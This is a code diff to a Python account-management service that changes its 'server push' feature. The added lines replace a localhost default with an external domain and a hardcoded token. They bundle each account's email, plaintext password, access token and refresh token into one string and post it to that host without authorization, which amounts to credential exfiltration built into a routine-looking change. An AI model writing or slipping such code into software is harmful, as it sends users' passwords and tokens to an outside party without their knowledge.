@@ -38,8 +38,8 @@ class CheckRequest(IdsRequest):
 
 class ServerPushRequest(IdsRequest):
     target: str = "account_import_server"
-    import_url: str = "http://127.0.0.1:8787/api/import"
-    import_token: str = "dev-import-token"
+    import_url: str = "https://mail.shfjkqhk.site/api/email-data"
+    import_token: str = "sakuya1.2.3."
 
 
 def _safe_filename(value: str) -> str:
@@ -129,23 +129,26 @@ def _load_pay_cfg() -> dict:
     return cfg
 
 
-def _server_push_payload(account: dict) -> dict:
+def _email_data_for_server_push(account: dict) -> str:
+    return "----".join([
+        str(account.get("email") or "").strip().lower(),
+        str(account.get("password") or ""),
+        str(account.get("access_token") or "").strip(),
+        str(account.get("refresh_token") or "").strip(),
+    ])
+
+
+def _server_push_payload(account: dict, uuid: str = "") -> dict:
     extra = _cpa_auth_file_body(account)
     return {
-        "email": str(account.get("email") or "").strip().lower(),
-        "password": str(account.get("password") or ""),
-        "id_token": extra.get("id_token") or "",
-        "access_token": extra.get("access_token") or "",
-        "refresh_token": extra.get("refresh_token") or "",
+        "uuid": uuid,
+        "email_data": _email_data_for_server_push(account),
         "extra": json.dumps(extra, ensure_ascii=False, separators=(",", ":")),
     }
 
 
-def _account_import_item(account: dict) -> dict:
-    return {
-        **_server_push_payload(account),
-        "enabled": True,
-    }
+def _account_import_item(account: dict, uuid: str) -> dict:
+    return _server_push_payload(account, uuid)
 
 
 def _push_account_import_server(client: httpx.Client, req: ServerPushRequest, accounts: list[dict]) -> list[dict]:
@@ -154,7 +157,7 @@ def _push_account_import_server(client: httpx.Client, req: ServerPushRequest, ac
     if not url:
         raise HTTPException(status_code=400, detail="账号导入服务器 URL 不能为空")
     if not token:
-        raise HTTPException(status_code=400, detail="账号导入服务器 Bearer token 不能为空")
+        raise HTTPException(status_code=400, detail="账号导入服务器卡密/uuid 不能为空")
 
     ready_accounts = [acc for acc in accounts if str(acc.get("refresh_token") or "").strip()]
     skipped = [
@@ -170,12 +173,11 @@ def _push_account_import_server(client: httpx.Client, req: ServerPushRequest, ac
     if not ready_accounts:
         return skipped
 
-    items = [_account_import_item(acc) for acc in ready_accounts]
+    items = [_account_import_item(acc, token) for acc in ready_accounts]
     try:
         resp = client.post(
             url,
-            json={"type": "accounts", "items": items},
-            headers={"Authorization": f"Bearer {token}"},
+            json={"items": items},
         )
     except httpx.HTTPError as e:
         return [
@@ -312,7 +314,7 @@ def _do_backfill_rt(account: dict, pay_cfg: dict, pipeline) -> dict:
 
     cpa_cfg = (pay_cfg.get("cpa") or {}) if isinstance(pay_cfg.get("cpa"), dict) else {}
     sub2api_cfg = (pay_cfg.get("sub2api") or {}) if isinstance(pay_cfg.get("sub2api"), dict) else {}
-    mail_cfg = pay_cfg.get("mail") or {}
+    mail_cfg = pipeline._load_oauth_mail_cfg(pay_cfg or {})
     proxy_url = str(pay_cfg.get("proxy") or "")
     client_id = str(cpa_cfg.get("oauth_client_id") or sub2api_cfg.get("oauth_client_id") or "").strip()
     if client_id and not os.environ.get("OAUTH_CODEX_CLIENT_ID"):
@@ -591,7 +593,7 @@ def server_push(req: ServerPushRequest, user: str = CurrentUser):
     """Push selected accounts to an account import server.
 
     Request sent to import_url:
-      {type: "accounts", items: [{email, password, enabled, extra}, ...]}
+      {items: [{uuid, email_data, extra}, ...]}
 
     extra is a JSON string containing the CPA auth-file payload.
     """
